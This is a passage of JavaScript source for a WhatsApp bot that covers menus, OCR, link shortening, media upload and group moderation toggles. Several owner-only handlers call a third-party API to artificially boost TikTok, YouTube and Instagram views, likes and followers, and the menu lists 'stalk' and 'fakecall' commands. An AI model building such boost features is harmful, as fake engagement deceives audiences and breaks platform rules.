> │❍ 𝒚𝒖𝒍𝒊𝒃𝒐𝒄𝒊𝒍
> │❍ 𝒚𝒖𝒎𝒆𝒌𝒐
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐`
      },
      {
        title: 'SEARCH',
        text: `
> ╭═━⪩ 〖  𝑺𝑬𝑨𝑹𝑪𝑯  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒑𝒍𝒂𝒚𝒔𝒕𝒐𝒓𝒆
> │❍ 𝒑𝒍𝒂𝒚𝒔𝒕𝒂𝒕𝒊𝒐𝒏
> │❍ 𝒈𝒐𝒐𝒈𝒍𝒆
> │❍ 𝒄𝒉𝒓𝒐𝒎𝒆
> │❍ 𝒈𝒊𝒎𝒂𝒈𝒆
> │❍ 𝒃𝒊𝒏𝒈𝒔𝒓𝒄
> │❍ 𝒃𝒊𝒏𝒈𝒊𝒎𝒈
> │❍ 𝒃𝒊𝒏𝒈𝒗𝒊𝒅𝒆𝒐
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐`
      },
      {
        title: 'ENCRYPTION',
        text: `
> ╭═━⪩ 〖  𝑬𝑵𝑪𝑹𝒀𝑷𝑻𝑰𝑶𝑵  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒆𝒏𝒄𝒂𝒓𝒂𝒃
> │❍ 𝒆𝒏𝒄𝒄𝒉𝒊𝒏𝒂
> │❍ 𝒆𝒏𝒄𝒄𝒖𝒔𝒕𝒐𝒎
> │❍ 𝒆𝒏𝒄𝒊𝒏𝒗𝒊𝒔
> │❍ 𝒆𝒏𝒄𝒔𝒊𝒖
> │❍ 𝒆𝒏𝒄𝒔𝒕𝒓𝒐𝒏𝒈
> │❍ 𝒆𝒏𝒄𝒖𝒍𝒕𝒓𝒂
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐`
      },
      {
        title: 'EPHOTO',
        text: `
> ╭═━⪩ 〖  𝑬𝑷𝑯𝑶𝑻𝑶  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒈𝒍𝒊𝒕𝒄𝒉𝒕𝒆𝒙𝒕
> │❍ 𝒘𝒓𝒊𝒕𝒆𝒕𝒆𝒙𝒕
> │❍ 𝒂𝒅𝒗𝒂𝒏𝒄𝒆𝒅𝒈𝒍𝒐𝒘
> │❍ 𝒕𝒚𝒑𝒐𝒈𝒓𝒂𝒑𝒉𝒚𝒕𝒆𝒙𝒕
> │❍ 𝒑𝒊𝒙𝒆𝒍𝒈𝒍𝒊𝒕𝒄𝒉
> │❍ 𝒏𝒆𝒐𝒏𝒈𝒍𝒊𝒕𝒄𝒉
> │❍ 𝒇𝒍𝒂𝒈𝒕𝒆𝒙𝒕
> │❍ 𝒇𝒍𝒂𝒈𝟑𝒅𝒕𝒆𝒙𝒕
> │❍ 𝒅𝒆𝒍𝒆𝒕𝒊𝒏𝒈𝒕𝒆𝒙𝒕
> │❍ 𝒃𝒍𝒂𝒄𝒌𝒑𝒊𝒏𝒌𝒔𝒕𝒚𝒍𝒆
> │❍ 𝒈𝒍𝒐𝒘𝒊𝒏𝒈𝒕𝒆𝒙𝒕
> │❍ 𝒖𝒏𝒅𝒆𝒓𝒘𝒂𝒕𝒆𝒓𝒕𝒆𝒙𝒕
> │❍ 𝒍𝒐𝒈𝒐𝒎𝒂𝒌𝒆𝒓
> │❍ 𝒄𝒂𝒓𝒕𝒐𝒐𝒏𝒔𝒕𝒚𝒍𝒆
> │❍ 𝒑𝒂𝒑𝒆𝒓𝒄𝒖𝒕𝒔𝒕𝒚𝒍𝒆
> │❍ 𝒘𝒂𝒕𝒆𝒓𝒄𝒐𝒍𝒐𝒓𝒕𝒆𝒙𝒕
> │❍ 𝒆𝒇𝒇𝒆𝒄𝒕𝒄𝒍𝒐𝒖𝒅𝒔
> │❍ 𝒃𝒍𝒂𝒄𝒌𝒑𝒊𝒏𝒌𝒍𝒐𝒈𝒐
> │❍ 𝒈𝒓𝒂𝒅𝒊𝒆𝒏𝒕𝒕𝒆𝒙𝒕
> │❍ 𝒔𝒖𝒎𝒎𝒆𝒓𝒃𝒆𝒂𝒄𝒉
> │❍ 𝒍𝒖𝒙𝒖𝒓𝒚𝒈𝒐𝒍𝒅
> │❍ 𝒎𝒖𝒍𝒕𝒊𝒄𝒐𝒍𝒐𝒚𝒆𝒍𝒍𝒐𝒘𝒏𝒆𝒐𝒏
> │❍ 𝒔𝒂𝒏𝒅𝒔𝒖𝒎𝒎𝒆𝒓
> │❍ 𝒈𝒂𝒍𝒂𝒙𝒚𝒘𝒂𝒍𝒍𝒑𝒂𝒑𝒆𝒓
> │❍ 𝟏𝟗𝟏𝟕𝒔𝒕𝒚𝒍𝒆
> │❍ 𝒎𝒂𝒌𝒊𝒏𝒈𝒏𝒆𝒐𝒏
> │❍ 𝒓𝒐𝒚𝒂𝒍𝒕𝒆𝒙𝒕
> │❍ 𝒇𝒓𝒆𝒆𝒄𝒓𝒆𝒂𝒕𝒆
> │❍ 𝒈𝒂𝒍𝒂𝒙𝒚𝒔𝒕𝒚𝒍𝒆
> │❍ 𝒍𝒊𝒈𝒉𝒕𝒆𝒇𝒇𝒆𝒄𝒕𝒔
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐`
      },
      {
        title: 'MAKER',
        text: `
> ╭═━⪩ 〖  𝑴𝑨𝑲𝑬𝑹  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒂𝒏𝒊𝒎𝒆𝒈𝒊𝒓𝒍
> │❍ 𝒇𝒂𝒌𝒆𝒄𝒂𝒍𝒍
> │❍ 𝒃𝒓𝒂𝒕
> │❍ 𝒑𝒂𝒌-𝒖𝒔𝒕𝒂𝒅
> │❍ 𝒏𝒈𝒍
> │❍ 𝒕𝒐𝒈𝒖𝒓𝒂
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑺𝑻𝑨𝑳𝑲  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒔𝒕𝒂𝒍𝒌𝒊𝒈
> │❍ 𝒔𝒕𝒂𝒍𝒌𝒓𝒐𝒃𝒍𝒐𝒙
> │❍ 𝒔𝒕𝒂𝒍𝒌𝒕𝒘𝒊𝒕𝒆𝒓
> │❍ 𝒔𝒕𝒂𝒍𝒌𝒚𝒕
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑰𝑵𝑺𝑻𝑨𝑳𝑳  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒊𝒏𝒔𝒕𝒂𝒍𝒍𝒑𝒂𝒏𝒆𝒍
> │❍ 𝒖𝒊𝒏𝒔𝒕𝒂𝒍𝒍𝒑𝒂𝒏𝒆𝒍
> │❍ 𝒊𝒏𝒔𝒕𝒂𝒍𝒍𝒕𝒆𝒎𝒂𝒃𝒊𝒍𝒍𝒊𝒏𝒈
> │❍ 𝒊𝒏𝒔𝒕𝒂𝒍𝒍𝒕𝒆𝒎𝒂𝒆𝒏𝒊𝒈𝒎𝒂
> │❍ 𝒊𝒏𝒔𝒕𝒂𝒍𝒍𝒕𝒆𝒎𝒂𝒔𝒕𝒆𝒍𝒍𝒂𝒓
> │❍ 𝒖𝒊𝒏𝒔𝒕𝒂𝒍𝒍𝒕𝒆𝒎𝒂
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐

> ╭═━⪩ 〖  𝑩𝑼𝒀𝑷𝑨𝑵𝑬𝑳  〗═══━•⩵꙰ཱི࿐
> │❍ 𝒃𝒖𝒚𝒑𝒂𝒏𝒆𝒍
> │❍ 𝒗𝒆𝒓𝒊𝒇𝒚𝒑𝒂𝒚𝒎𝒆𝒏𝒕
> ╰━ ━ ━ ━ ━ ━  ━ ━ ━•⩵꙰ཱི࿐`
      }
    ];

    // ── Count total commands ──
    let totalFitur = 0;
    for (const box of categoryBoxes) {
      const lines = box.text.split('\n');
      for (const line of lines) {
        if (line.includes('│❍')) totalFitur++;
      }
    }

    // ── Back to Menu button ──
    const backButton = {
      name: 'reply',
      buttonParamsJson: JSON.stringify({
        display_text: '🔙 Back to Menu',
        id: `${prefix}blacklord`
      })
    };

    // ── Build carousel cards (NO image in header) ──
    const carouselCards = categoryBoxes.map((box, index) => ({
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: `📁 ${box.title}`,
        hasMediaAttachment: false,
      }),
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: ft(box.text, sock),
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: ft(`📖 Page ${index + 1} of ${categoryBoxes.length} • ${botName}`, sock),
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [backButton],
      }),
    }));

    // ── Split into chunks of 10 ──
    const CARD_LIMIT = 10;
    for (let i = 0; i < carouselCards.length; i += CARD_LIMIT) {
      const chunk = carouselCards.slice(i, i + CARD_LIMIT);

      const interactiveMsg = proto.Message.InteractiveMessage.fromObject({
        header: proto.Message.InteractiveMessage.Header.fromObject({
          title: `📋 ${botName} – Casual Menu`,
          hasMediaAttachment: false,
        }),
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: ft(`📌 *Casual Menu* – swipe through categories.\nTotal commands: ${totalFitur}`, sock),
        }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({
          text: ft(`© ${global.name || 'Samsung XMD'} • ${settings.COMPANY || 'Incorporative'}`, sock),
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: chunk,
        }),
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: settings.CHANNEL_JID || '120363407629340544@newsletter',
            newsletterName: settings.CHANNEL_NAME || '〖 🟢 𝐁𝐋𝐀𝐂𝐊𝐋𝐎𝐑𝐃 𝐓𝐀𝐋𝐊𝐋𝐄𝐒𝐒 🟢 〗',
          },
          externalAdReply: {
            title: ft(global.name || 'Samsung XMD', sock),
            body: ft(`version • ${global.version || '3.1.0'}`, sock),
            thumbnailUrl: c.thumbnail2 || settings.DEFAULT_MENU_IMG || 'https://i.imgur.com/your-default-thumb.jpg',
            sourceUrl: `https://uptime • ${myUptime}`,
            mediaType: 1,
            renderLargerThumbnail: false,
          },
        },
      });

      await sock.sendMessage(
        jid,
        { interactiveMessage: interactiveMsg },
        { quoted: m }
      );

      if (i + CARD_LIMIT < carouselCards.length) await sleep(500);
    }

    console.log('[CASUAL] Carousel sent successfully.');

  } catch (err) {
    console.error('[CASUAL] Error:', err);

    // ── Fallback: plain text ──
    let fallback = `📋 *${botName} – Casual Menu*\n\n`;
    for (const box of categoryBoxes) {
      fallback += box.text + '\n\n';
    }
    await sock.sendMessage(jid, { text: ft(fallback, sock) }, { quoted: m });
  }
  break;
}
    case 'ocr': {
      const { qMsg, qType, qKey } = getQuoted(m);
      const imgMsg = m.message?.imageMessage || (qType === 'imageMessage' ? qMsg?.imageMessage : null);
      if (!imgMsg) { await reply('Reply to an image.'); break; }
      try {
        const srcKey = m.message?.imageMessage ? m.key : qKey;
        const buf    = await dlMedia({ imageMessage: imgMsg }, srcKey);
        const b64    = buf.toString('base64');
        const r      = await axios.post('https://api.ocr.space/parse/image',
          `base64Image=data:image/jpeg;base64,${b64}&language=eng`,
          { headers: { apikey: 'helloworld', 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 15000 }
        );
        const txt2 = r.data?.ParsedResults?.[0]?.ParsedText || 'No text found.';
        await reply(`📝 OCR:\n${txt2}`);
      } catch { await reply('❌ OCR failed.'); }
      break;
    }

    case 'shorten': {
      const url = args[0];
      if (!url?.startsWith('http')) { await reply(`${prefix}shorten <url>`); break; }
      try {
        const r = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`, { timeout: 8000 });
        await reply(`🔗 ${r.data}`);
      } catch { await reply('❌ Failed.'); }
      break;
    }

    case 'tourl':
case 'upload':
case 'toupload': {
    await reaction('📄');

    const { qMsg: qMsgTU, qType: qTypeTU, qKey: qKeyTU } = getQuoted(m);
    const MEDIA_TYPES = ['imageMessage', 'videoMessage', 'stickerMessage', 'audioMessage', 'documentMessage'];
    const mediaTypeTU = MEDIA_TYPES.find(t2 => qMsgTU?.[t2]);

    if (!qMsgTU || !mediaTypeTU) {
        await sock.sendMessage(jid, {
            text: `❌ Reply to an image, video, sticker, or audio with .tourl`
        }, { quoted: m });
        break;
    }

    try {
        // 1. Download the media
        const buf = await dlMedia(qMsgTU, qKeyTU);
        if (!buf) throw new Error('Media download failed');

        // 2. Upload to Catbox.moe (free, no auth)
        const form = new FormData();
        const ext = mediaTypeTU.replace('Message', '').toLowerCase();
        const filename = `upload_${Date.now()}.${ext === 'sticker' ? 'webp' : ext === 'audio' ? 'mp3' : 'mp4'}`;
        form.append('fileToUpload', buf, filename);
        form.append('reqtype', 'fileupload');

        const response = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: {
                ...form.getHeaders(),
                'User-Agent': 'Mozilla/5.0',
            },
            timeout: 30000,
        });

        const link = response.data.trim();
        if (!link || !link.startsWith('https://')) throw new Error('Upload failed');

        // 3. Send the link as a clean reply
        await sock.sendMessage(jid, {
            text: `✅ *Upload Complete!*\n\n🔗 ${link}\n\n📌 Expires: Never`
        }, { quoted: m });

        await reaction('✅');

    } catch (e) {
        console.error('[tourl] Error:', e.message);
        await sock.sendMessage(jid, {
            text: `❌ Upload failed: ${e.message}`
        }, { quoted: m });
    }
    break;
}

case 'tiktokboost':
case 'ttboost': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: video_views, video_likes, followers\n` +
    `Examples:\n${prefix}${cmd} https://www.tiktok.com/@user/video/123456789 | video_views\n` +
    `${prefix}${cmd} https://www.tiktok.com/@username | followers`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'video_views').toLowerCase();
  const validTypes = ['video_views', 'video_likes', 'followers'];
  if (!validTypes.includes(type)) {
    return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  }
  if (type === 'followers') {
    const username = url.includes('tiktok.com') ? url.split('@')[1]?.split('/')[0] : url.replace('@', '');
    if (!username) return reply('❌ Provide a valid TikTok username or profile URL for followers');
  } else if (!url.includes('tiktok.com/video/')) {
    return reply('❌ For video_views or video_likes, provide a valid TikTok video URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing TikTok boost… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/tiktok/boost?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) {
      throw new Error(response.data?.message || 'Unknown error');
    }
    const data = response.data;
    let resultMsg = `*🚀 TikTok Boost Successful!*\n\n`;
    resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.data?.amount_processed) resultMsg += `📊 Processed: ${data.data.amount_processed}\n`;
    if (data.username) resultMsg += `👤 Username: ${data.username}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('TikTok boost error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}
// ─── ADDITIONAL GROUP MANAGEMENT ────────────────────────

// ── Antijudol ──
case 'antijudol': {
  if (needGroup() || needAdmin()) break;
  const state = args[0]?.toLowerCase();
  if (!['on', 'off'].includes(state)) {
    const current = loadFlag(jid, 'antijudol', false) ? 'ON' : 'OFF';
    await reply(`🤑 *Anti‑Judol* is currently ${current}\nUsage: .antijudol on/off`);
    break;
  }
  saveFlag(jid, 'antijudol', state === 'on');
  await reply(`✅ Anti‑Judol is now ${state.toUpperCase()}`);
  break;
}

// ── Antiwame ──
case 'antiwame': {
  if (needGroup() || needAdmin()) break;
  const state = args[0]?.toLowerCase();
  if (!['on', 'off'].includes(state)) {
    const current = loadFlag(jid, 'antiwame', false) ? 'ON' : 'OFF';
    await reply(`🔗 *Anti‑wa.me* is currently ${current}\nUsage: .antiwame on/off`);
    break;
  }
  saveFlag(jid, 'antiwame', state === 'on');
  await reply(`✅ Anti‑wa.me is now ${state.toUpperCase()}`);
  break;
}

// ── Antilinkig ──
case 'antilinkig': {
  if (needGroup() || needAdmin()) break;
  const state = args[0]?.toLowerCase();
  if (!['on', 'off'].includes(state)) {
    const current = loadFlag(jid, 'antilinkig', false) ? 'ON' : 'OFF';
    await reply(`📸 *Anti‑Instagram Link* is currently ${current}\nUsage: .antilinkig on/off`);
    break;
  }
  saveFlag(jid, 'antilinkig', state === 'on');
  await reply(`✅ Anti‑Instagram Link is now ${state.toUpperCase()}`);
  break;
}

// ── Antilinkch ──
case 'antilinkch': {
  if (needGroup() || needAdmin()) break;
  const state = args[0]?.toLowerCase();
  if (!['on', 'off'].includes(state)) {
    const current = loadFlag(jid, 'antilinkch', false) ? 'ON' : 'OFF';
    await reply(`📢 *Anti‑Channel Link* is currently ${current}\nUsage: .antilinkch on/off`);
    break;
  }
  saveFlag(jid, 'antilinkch', state === 'on');
  await reply(`✅ Anti‑Channel Link is now ${state.toUpperCase()}`);
  break;
}

// ── Antitagsw ──
case 'antitagsw': {
  if (needGroup() || needAdmin()) break;
  const state = args[0]?.toLowerCase();
  if (!['on', 'off'].includes(state)) {
    const current = loadFlag(jid, 'antitagsw', false) ? 'ON' : 'OFF';
    await reply(`🚫 *Anti‑Status Mention* is currently ${current}\nUsage: .antitagsw on/off`);
    break;
  }
  saveFlag(jid, 'antitagsw', state === 'on');
  await reply(`✅ Anti‑Status Mention is now ${state.toUpperCase()}`);
  break;
}

// ── Antivideo ──
case 'antivideo': {
  if (needGroup() || needAdmin()) break;
  const state = args[0]?.toLowerCase();
  if (!['on', 'off'].includes(state)) {
    const current = loadFlag(jid, 'antivideo', false) ? 'ON' : 'OFF';
    await reply(`🎥 *Anti‑Video* is currently ${current}\nUsage: .antivideo on/off`);
    break;
  }
  saveFlag(jid, 'antivideo', state === 'on');
  await reply(`✅ Anti‑Video is now ${state.toUpperCase()}`);
  break;
}

// ── Antifoto ──
case 'antifoto':
case 'antiphoto': {
  if (needGroup() || needAdmin()) break;
  const state = args[0]?.toLowerCase();
  if (!['on', 'off'].includes(state)) {
    const current = loadFlag(jid, 'antifoto', false) ? 'ON' : 'OFF';
    await reply(`🖼️ *Anti‑Photo* is currently ${current}\nUsage: .antifoto on/off`);
    break;
  }
  saveFlag(jid, 'antifoto', state === 'on');
  await reply(`✅ Anti‑Photo is now ${state.toUpperCase()}`);
  break;
}

// ── Antispam ──
case 'antispam': {
  if (needGroup() || needAdmin()) break;
  const state = args[0]?.toLowerCase();
  if (!['on', 'off'].includes(state)) {
    const current = loadFlag(jid, 'antispam', false) ? 'ON' : 'OFF';
    await reply(`🛡️ *Anti‑Spam* is currently ${current}\nUsage: .antispam on/off`);
    break;
  }
  saveFlag(jid, 'antispam', state === 'on');
  await reply(`✅ Anti‑Spam is now ${state.toUpperCase()}`);
  break;
}

// ── Antimention ──
case 'antimention': {
  if (needGroup() || needAdmin()) break;
  const state = args[0]?.toLowerCase();
  if (!['on', 'off'].includes(state)) {
    const current = loadFlag(jid, 'antimention', false) ? 'ON' : 'OFF';
    await reply(`👥 *Anti‑Mention* is currently ${current}\nUsage: .antimention on/off`);
    break;
  }
  saveFlag(jid, 'antimention', state === 'on');
  await reply(`✅ Anti‑Mention is now ${state.toUpperCase()}`);
  break;
}

// ── Slowmode ──
case 'slowmode': {
  if (needGroup() || needAdmin()) break;
  const input = args[0];
  if (!input || input === 'off') {
    setSlowMode(jid, 0);
    await reply(`⏳ Slow mode disabled.`);
    break;
  }
  const seconds = parseInt(input);
  if (isNaN(seconds) || seconds < 1 || seconds > 60) {
    await reply(`⏳ Usage: .slowmode <seconds 1-60> | off\nExample: .slowmode 5 (5 second cooldown)`);
    break;
  }
  setSlowMode(jid, seconds);
  await reply(`⏳ Slow mode set to ${seconds} second(s) between messages.`);
  break;
}
case 'youtubeboost':
case 'ytboost': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: views, likes, subscribers\n` +
    `Examples:\n${prefix}${cmd} https://www.youtube.com/watch?v=... | views\n` +
    `${prefix}${cmd} https://www.youtube.com/@ChannelName | subscribers`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'views').toLowerCase();
  const validTypes = ['views', 'likes', 'subscribers'];
  if (!validTypes.includes(type)) return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  if (type === 'subscribers') {
    if (!url.includes('youtube.com/@') && !url.includes('youtube.com/channel/')) {
      return reply('❌ For subscribers, provide a valid YouTube channel URL (e.g., https://www.youtube.com/@ChannelName)');
    }
  } else if (!url.includes('youtube.com/watch') && !url.includes('youtu.be/')) {
    return reply('❌ For views/likes, provide a valid YouTube video URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing YouTube boost… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/youtube/boost?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');
    const data = response.data;
    let resultMsg = `*🚀 YouTube Boost Successful!*\n\n`;
    resultMsg += `📹 URL: ${url.substring(0, 50)}${url.length > 50 ? '...' : ''}\n`;
    resultMsg += `⚡ Type: ${data.type || type}\n`;
    if (data.amount) resultMsg += `📊 Amount: ${data.amount}\n`;
    if (data.message) resultMsg += `📝 ${data.message}\n`;
    resultMsg += `\n_ᴘᴏᴡᴇʀᴇᴅ ʙʏ ꨄ𝑺𝒂𝒎𝒔𝒖𝒏𝒈 𝑷𝒓𝒆𝒎𝒊𝒖𝒎 𝐗𝐌𝐃 ʙᴏᴛ_`;
    await reply(resultMsg);
    await reaction('✅');
  } catch (err) {
    console.error('YouTube boost error:', err);
    await reaction('❌');
    await reply(`❌ Boost failed: ${err.message}`);
  }
  break;
}
    // ══════════════════════════════════════════════════════
    //   ALLMENU – Interactive list (cards) with all commands
    //   No database – Blacklord font – images from settings
    //   Automatically includes all commands from CMDS
    // ══════════════════════════════════════════════════════
  /*  case 'menu': {
      await reaction('🌹');

      // ── Get images from settings ──
      const menuImg = c.menuImg || settings.DEFAULT_MENU_IMG || 'https://i.imgur.com/your-default-image.jpg';
      const menuThumb = c.thumbnail2 || settings.DEFAULT_MENU_IMG || 'https://i.imgur.com/your-default-thumb.jpg';

      // ── Status values (safe fallbacks) ──
      const myName = pushname || 'User';
      const myNumber = senderNumber || 'Unknown';
      const myStatus = _isOwner ? '𝗢𝘄𝗻𝗲𝗿' : isPremium ? '𝗣𝗿𝗲𝗺𝗶𝘂𝗺' : '𝗙𝗿𝗲𝗲';
      const myMode = sock.public ? '𝗣𝘂𝗯𝗹𝗶𝗰' : '𝗦𝗲𝗹𝗳';
      const myUptime = typeof runtime === 'function' ? runtime(process.uptime()) : formatUptime(process.uptime() * 1000);
      const totalFitur = Object.values(CMDS).reduce((acc, arr) => acc + arr.length, 0);
      const botName = c.botName || settings.BOT_NAME || '𝐁𝐋𝐀𝐂𝐊𝐋𝐎𝐑𝐃  𝐓𝐀𝐋𝐊𝐋𝐄𝐒𝐒';
      const latensi = (performance.now() - performance.now()).toFixed(4);

      // ── Status caption (styled with ft) ──
      const statusCaption = ft(`
•━═ 〘  𝐗𝐇𝐘𝐏𝐇𝐄𝐑   𝐏𝐑𝐎  〙═━• 

> ╭═━⪩〘 𝑿𝑯𝒀𝑷𝑯𝑬𝑹 𝑺𝑻𝑨𝑻𝑼𝑺 〙•━•⩵꙰ཱི࿐
> │⫹⫺ 𝗡𝗮𝗺𝗲        : ${myName}
> │⫹⫺ 𝗡𝘂𝗺𝗯𝗲𝗿      : ${myNumber}
> │⫹⫺ 𝗦𝘁𝗮𝘁𝘂𝘀      : ${myStatus}
> │⫹⫺ 𝗟𝗶𝗺𝗶𝘁       : 0
> │⫹⫺ 𝗕𝗼𝘁 𝗡𝗮𝗺𝗲    : ${botName}
> │⫹⫺ 𝗨𝗽𝘁𝗶𝗺𝗲      : ${myUptime}
> │⫹⫺ 𝗠𝗼𝗱𝗲        : ${myMode}
> │⫹⫺ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱𝘀    : ${totalFitur} 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀
> │⫹⫺ 𝗨𝘀𝗲𝗿𝘀       : 0 𝘂𝘀𝗲𝗿𝘀
> │⫹⫺ 𝗦𝗽𝗲𝗲𝗱       : ${latensi}𝘀
> │⫹⫺ 𝗦𝗰𝗿𝗶𝗽𝘁      : ${global.name || 'samsung-md-bot'}
> │⫹⫺ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻     : ${global.version || '3.1.0'}
> │⫹⫺ 𝗕𝗮𝗶𝗹𝗲𝘆𝘀     : ${global.description || '@whiskeysockets/baileys'}
> │⫹⫺ 𝗠𝗮𝗶𝗻 𝗙𝗶𝗹𝗲  : ${global.main || 'index.js'}
> │⫹⫺ 𝗣𝗿𝗲𝗳𝗶𝘅      : 𝗠𝘂𝗹𝘁𝗶 𝗣𝗿𝗲𝗳𝗶𝗳
> ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
`, sock);

      // ── Build interactive sections from CMDS ──
      const sections = [];

      // Add a "Quick Actions" section first
      sections.push({
        title: "⚡ Quick Actions",
        highlight_label: "Go",
        rows: [
          { title: "all commands", description: "see all xhypher commands", id: ".allmenu" },
          { title: "càrds menu ", description: "see well arranged cards menu", id: ".cards" },
               { title: "devoloper Contact", description: "Get devoloper's contact", id: ".owner" }
        ]
      });

      // Loop through all categories in CMDS
      for (const [cat, cmds] of Object.entries(CMDS)) {
        if (!cmds || cmds.length === 0) continue;

        // Build rows from commands
        const rows = cmds.map(cmd => ({
          title: `▸ ${cmd}`,
          description: `Run .${cmd}`,
          id: `.${cmd}`
        }));

        // Split large categories (max 10 rows per section)
        const chunkSize = 10;
        for (let i = 0; i < rows.length; i += chunkSize) {
          const chunk = rows.slice(i, i + chunkSize);
          const sectionTitle = i === 0 ? cat.toUpperCase() : `${cat.toUpperCase()} (${i/chunkSize + 1})`;
          sections.push({
            title: sectionTitle,
            highlight_label: cat,
            rows: chunk
          });
        }
      }

      // ── Send interactive message ──
      try {
        const imgBuf = await getBuffer(menuImg);
        await sock.sendMessage(jid, {
          image: imgBuf,
          caption: statusCaption,
          buttons: [
            {
              buttonId: 'action',
              buttonText: { displayText: '📋 Show All Commands' },
              type: 4,
              nativeFlowInfo: {
                name: 'single_select',
                paramsJson: JSON.stringify({
                  title: '📋 All Commands',
                  sections
                })
              }
            }
          ],
          footer: ft(global.name || 'Samsung XMD', sock),
          headerType: 1,
          viewOnce: true,
          contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: settings.CHANNEL_JID || '120363407629340544@newsletter',
              newsletterName: settings.CHANNEL_NAME || '〖 🟢 𝐁𝐋𝐀𝐂𝐊𝐋𝐎𝐑𝐃 𝐓𝐀𝐋𝐊𝐋𝐄𝐒𝐒 🟢 〗'
            },
            externalAdReply: {
              title: ft(global.name || 'Samsung XMD', sock),
              body: ft(`version • ${global.version || '3.1.0'}`, sock),
              thumbnailUrl: menuThumb,
              sourceUrl: `https://Uptime • ${myUptime}`,
              mediaType: 1,
              renderLargerThumbnail: false,
            }
          }
        }, { quoted: m });
      } catch (e) {
        // Fallback: send as plain text if interactive fails
        let fallback = statusCaption + '\n\n';
        for (const [cat, cmds] of Object.entries(CMDS)) {
          if (!cmds || cmds.length === 0) continue;
          fallback += `*${cat.toUpperCase()}*\n${cmds.map(c => `• ${c}`).join('\n')}\n\n`;
        }
        await sock.sendMessage(jid, { text: fallback }, { quoted: m });
      }
      break;
    }*/
case 'instagramboost2':
case 'igboost2': {
  if (!_isOwner) return reply('❌ Owner only.');
  if (!text) return reply(
    `Example: ${prefix}${cmd} <url> | <type>\n\n` +
    `Types: followers, likes, views, comments\n` +
    `Examples:\n${prefix}${cmd} https://www.instagram.com/username | followers\n` +
    `${prefix}${cmd} https://www.instagram.com/p/... | likes`
  );
  const parts = text.split('|');
  const url = parts[0].trim();
  const type = (parts[1]?.trim() || 'followers').toLowerCase();
  const validTypes = ['followers', 'likes', 'views', 'comments'];
  if (!validTypes.includes(type)) return reply(`❌ Invalid type. Use: ${validTypes.join(', ')}`);
  if (type === 'followers') {
    if (!url.includes('instagram.com/') && !url.startsWith('@')) {
      return reply('❌ For followers, provide a valid Instagram profile URL or username');
    }
  } else if (!url.includes('instagram.com/p/') && !url.includes('instagram.com/reel/')) {
    return reply('❌ For likes/views/comments, provide a valid post or reel URL');
  }
  await reaction('🚀');
  try {
    await reply(`🚀 Processing Instagram boost… (${type})`);
    const response = await axios.get(
      `https://apis.davidcyril.name.ng/api/Instagram/boost2?url=${encodeURIComponent(url)}&type=${type}`,
      { timeout: 30000 }
    );
    if (!response.data?.success) throw new Error(response.data?.message || 'Unknown error');
    const data = response.data;
    let resultMsg = `*🚀 Instagram Boost Successful!*\n\n`;
